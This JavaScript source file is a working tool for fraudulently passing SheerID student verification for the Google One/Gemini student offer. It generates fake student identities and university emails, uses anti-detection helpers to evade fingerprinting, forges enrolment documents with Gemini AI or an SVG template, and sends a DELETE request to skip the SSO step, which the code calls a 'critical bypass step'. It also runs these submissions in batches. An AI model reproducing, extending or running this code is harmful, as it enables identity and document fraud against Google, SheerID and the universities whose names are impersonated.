/**
 * SheerID Verifier Service
 * Core verification logic for Google Student / Gemini verification
 * Now with Gemini AI document generation!
 */

const { selectUniversity, recordResult } = require('../data/universities');
const {
    getHeaders,
    generateFingerprint,
    generateName,
    generateEmail,
    generateBirthDate,
    randomSleep,
    getRandomUserAgent
} = require('../utils/anti-detect');
const { generateDocument } = require('./document-generator');
const { generateDocumentWithGemini } = require('./gemini-generator');

// SheerID API base URL
const SHEERID_API_URL = 'https://services.sheerid.com/rest/v2';

// Google One Student Program ID
const PROGRAM_ID = '676f6f676c654f6e65';

/**
 * Parse verification ID from URL or raw ID
 */
function parseVerificationId(input) {
    // Try to extract from URL
    const urlMatch = input.match(/verificationId=([a-f0-9]+)/i);
    if (urlMatch) {
        return urlMatch[1];
    }

    // Check if it's a raw hex ID
    if (/^[a-f0-9]{20,}$/i.test(input.trim())) {
        return input.trim();
    }

    return null;
}

/**
 * SheerID Verifier Class
 */
class SheerIDVerifier {
    constructor(verificationId, options = {}) {
        this.vid = verificationId;
        this.proxy = options.proxy || process.env.PROXY_URL || null;
        this.userAgent = getRandomUserAgent();
        this.fingerprint = generateFingerprint();
        this.university = null;
        this.studentInfo = null;

        // Event emitter for progress updates
        this.onProgress = options.onProgress || (() => { });
    }

    /**
     * Make HTTP request to SheerID API
     */
    async request(method, endpoint, body = null) {
        await randomSleep(300, 800);

        const url = `${SHEERID_API_URL}${endpoint}`;
        const headers = getHeaders(this.userAgent);

        const fetchOptions = {
            method,
            headers,
        };

        if (body) {
            fetchOptions.body = JSON.stringify(body);
        }

        // Add proxy support if configured
        // Note: Node.js fetch doesn't natively support proxies
        // For production, consider using undici or https-proxy-agent

        try {
            const response = await fetch(url, fetchOptions);
            const text = await response.text();

            let data;
            try {
                data = text ? JSON.parse(text) : {};
            } catch {
                data = { _text: text };
            }

            return { data, status: response.status, ok: response.ok };
        } catch (error) {
            throw new Error(`Request failed: ${error.message}`);
        }
    }

    /**
     * Upload document to S3
     */
    async uploadToS3(uploadUrl, documentData, mimeType = 'image/png') {
        try {
            const response = await fetch(uploadUrl, {
                method: 'PUT',
                headers: {
                    'Content-Type': mimeType,
                },
                body: documentData,
            });

            return response.ok;
        } catch (error) {
            console.error('S3 upload failed:', error.message);
            return false;
        }
    }

    /**
     * Check if verification link is valid
     */
    async checkLink() {
        if (!this.vid) {
            return { valid: false, error: 'Invalid verification ID' };
        }

        const { data, status } = await this.request('GET', `/verification/${this.vid}`);

        if (status !== 200) {
            return { valid: false, error: `HTTP ${status}` };
        }

        const step = data.currentStep || '';
        const validSteps = ['collectStudentPersonalInfo', 'docUpload', 'sso'];

        if (validSteps.includes(step)) {
            return { valid: true, step, data };
        } else if (step === 'success') {
            return { valid: false, error: 'Already verified' };
        } else if (step === 'pending') {
            return { valid: false, error: 'Already pending review' };
        }

        return { valid: false, error: `Invalid step: ${step}` };
    }

    /**
     * Run full verification process
     */
    async verify() {
        if (!this.vid) {
            return { success: false, error: 'Invalid verification ID' };
        }

        try {
            // Step 0: Check current status
            this.onProgress({ step: 'checking', message: 'Checking verification status...' });
            const { data: checkData, status: checkStatus } = await this.request('GET', `/verification/${this.vid}`);
            let currentStep = checkStatus === 200 ? (checkData.currentStep || '') : '';

            // Generate student info
            this.university = selectUniversity();
            const { firstName, lastName } = generateName();
            const email = generateEmail(firstName, lastName, this.university.domain);
            const birthDate = generateBirthDate();

            this.studentInfo = { firstName, lastName, email, birthDate };

            this.onProgress({
                step: 'info_generated',
                message: `Student: ${firstName} ${lastName}`,
                details: {
                    name: `${firstName} ${lastName}`,
                    email,
                    school: this.university.name,
                    birthDate
                }
            });

            // Step 1: Generate document (try Gemini AI first, fallback to SVG)
            this.onProgress({ step: 'doc_generating', message: 'Generating verification document with AI...' });

            const geminiApiKey = process.env.GEMINI_API_KEY;
            let doc = await generateDocumentWithGemini('auto', firstName, lastName, this.university.name, birthDate, geminiApiKey);

            // Fallback to SVG if Gemini fails
            if (!doc) {
                this.onProgress({ step: 'doc_generating', message: 'Using fallback document generator...' });
                doc = generateDocument('auto', firstName, lastName, this.university.name, birthDate);
            } else {
                this.onProgress({ step: 'doc_generating', message: `AI generated ${doc.type} document` });
            }

            // Step 2: Submit student info (if needed)
            if (currentStep === 'collectStudentPersonalInfo') {
                this.onProgress({ step: 'submitting', message: 'Submitting student information...' });

                const submitBody = {
                    firstName,
                    lastName,
                    birthDate,
                    email,
                    phoneNumber: '',
                    organization: {
                        id: this.university.id,
                        idExtended: this.university.idExtended,
                        name: this.university.name
                    },
                    deviceFingerprintHash: this.fingerprint,
                    locale: 'en-US',
                    metadata: {
                        marketConsentValue: false,
                        verificationId: this.vid,
                        refererUrl: `https://services.sheerid.com/verify/${PROGRAM_ID}/?verificationId=${this.vid}`,
                    }
                };

                const { data: submitData, status: submitStatus } = await this.request(
                    'POST',
                    `/verification/${this.vid}/step/collectStudentPersonalInfo`,
                    submitBody
                );

                if (submitStatus !== 200) {
                    recordResult(this.university.name, false);
                    return { success: false, error: `Submit failed: HTTP ${submitStatus}`, details: submitData };
                }

                if (submitData.currentStep === 'error') {
                    recordResult(this.university.name, false);
                    return { success: false, error: `Error: ${(submitData.errorIds || []).join(', ')}` };
                }

                currentStep = submitData.currentStep || '';
            }

            // Step 3: Skip SSO (critical bypass step)
            if (currentStep === 'sso' || currentStep === 'collectStudentPersonalInfo') {
                this.onProgress({ step: 'sso_bypass', message: 'Bypassing SSO verification...' });
                await this.request('DELETE', `/verification/${this.vid}/step/sso`);
                await randomSleep(500, 1000);
            }

            // Step 4: Upload document
            this.onProgress({ step: 'uploading', message: 'Uploading verification document...' });

            const uploadBody = {
                files: [{
                    fileName: doc.fileName,
                    mimeType: doc.mimeType,
                    fileSize: doc.data.length
                }]
            };

            const { data: uploadData, status: uploadStatus } = await this.request(
                'POST',
                `/verification/${this.vid}/step/docUpload`,
                uploadBody
            );

            if (!uploadData.documents || !uploadData.documents[0]) {
                recordResult(this.university.name, false);
                return { success: false, error: 'No upload URL received' };
            }

            const uploadUrl = uploadData.documents[0].uploadUrl;
            const uploadSuccess = await this.uploadToS3(uploadUrl, doc.data, doc.mimeType);

            if (!uploadSuccess) {
                recordResult(this.university.name, false);
                return { success: false, error: 'Document upload failed' };
            }

            // Step 5: Complete upload
            this.onProgress({ step: 'completing', message: 'Completing verification...' });

            const { data: completeData } = await this.request(
                'POST',
                `/verification/${this.vid}/step/completeDocUpload`
            );

            const finalStep = completeData.currentStep || 'pending';

            // Record result
            const success = finalStep === 'success' || finalStep === 'pending';
            recordResult(this.university.name, success);

            this.onProgress({
                step: finalStep === 'success' ? 'success' : 'pending',
                message: finalStep === 'success' ? 'Verification successful!' : 'Submitted for review (24-48h)'
            });

            return {
                success: true,
                status: finalStep,
                message: finalStep === 'success'
                    ? 'Verification successful!'
                    : 'Verification submitted! Wait 24-48 hours for review.',
                student: `${firstName} ${lastName}`,
                email,
                school: this.university.name,
                redirectUrl: completeData.redirectUrl || null
            };

        } catch (error) {
            if (this.university) {
                recordResult(this.university.name, false);
            }
            return { success: false, error: error.message };
        }
    }
}

/**
 * Verify a single verification ID
 */
async function verifySingle(verificationIdOrUrl, options = {}) {
    const vid = parseVerificationId(verificationIdOrUrl);
    if (!vid) {
        return { success: false, error: 'Invalid verification ID or URL' };
    }

    const verifier = new SheerIDVerifier(vid, options);

    // Check link first
    const check = await verifier.checkLink();
    if (!check.valid) {
        return { success: false, error: check.error, verificationId: vid };
    }

    // Run verification
    const result = await verifier.verify();
    return { ...result, verificationId: vid };
}

/**
 * Verify multiple verification IDs
 */
async function verifyBatch(verificationIds, options = {}) {
    const results = [];
    const onProgress = options.onProgress || (() => { });

    for (let i = 0; i < verificationIds.length; i++) {
        const id = verificationIds[i];
        onProgress({
            type: 'batch_progress',
            current: i + 1,
            total: verificationIds.length,
            verificationId: id
        });

        try {
            const result = await verifySingle(id, {
                ...options,
                onProgress: (progress) => {
                    onProgress({ ...progress, verificationId: id });
                }
            });
            results.push(result);
        } catch (error) {
            results.push({
                success: false,
                error: error.message,
                verificationId: parseVerificationId(id) || id
            });
        }

        // Delay between verifications
        if (i < verificationIds.length - 1) {
            await randomSleep(2000, 4000);
        }
    }

    return results;
}

module.exports = {
    SheerIDVerifier,
    verifySingle,
    verifyBatch,
    parseVerificationId,
};
